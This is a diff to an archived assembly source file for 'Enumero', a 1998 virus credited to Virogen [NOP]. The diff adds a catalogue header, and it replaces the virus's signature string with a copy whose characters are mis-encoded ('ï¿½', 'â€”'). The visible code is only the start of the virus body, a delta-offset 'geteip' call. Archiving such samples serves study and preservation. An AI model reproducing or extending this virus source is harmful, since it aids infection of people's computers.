@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      E
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;
 ; Enumero, (c)1998 by Virogen[NOP]
 ; http://virogen.cjb.net
@@ -82,7 +93,7 @@ extrn IsBadReadPtr:PROC
         
 org 0  
 .data           
-db 'þ [Enumero] by Virogen [NOP] þ'               ; it's i said the fly
+db 'ï¿½ [Enumero] by Virogen [NOP] ï¿½'               ; it's i said the fly
 .code
 vstart:    
     call geteip                               ; find relative offset
